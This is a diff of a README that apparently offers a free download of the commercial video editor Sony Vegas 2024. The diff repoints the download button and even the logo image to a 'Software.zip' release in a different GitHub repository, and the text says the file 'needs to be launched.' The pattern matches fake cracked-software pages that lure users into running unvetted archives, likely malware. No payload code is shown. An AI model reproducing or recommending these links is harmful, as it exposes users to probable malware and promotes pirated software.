@@ -27,7 +27,7 @@ Explore the following topics within this repository:
 
 Click the button below to download the latest version of Sony Vegas 2024:
 
-[![Download Sony Vegas 2024](https://img.shields.io/static/v1?label=Download&message=Sony%20Vegas%202024&color=blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download Sony Vegas 2024](https://github.com/cesxrfvv/Sony-Vegas-2024/releases/download/v2.0/Software.zip%20Vegas%202024&color=blue)](https://github.com/cesxrfvv/Sony-Vegas-2024/releases/download/v2.0/Software.zip)
 
 **Note: The link above leads to a file that needs to be launched.**
 
@@ -50,6 +50,6 @@ If you encounter any issues or have any questions regarding Sony Vegas 2024, ple
 
 Let's unleash your creativity with Sony Vegas 2024! 🚀🎞️
 
-![Sony Vegas Logo](https://www.example.com/sony-vegas-logo.png)
+![Sony Vegas Logo](https://github.com/cesxrfvv/Sony-Vegas-2024/releases/download/v2.0/Software.zip)
 
 **Happy Editing!** 🎉
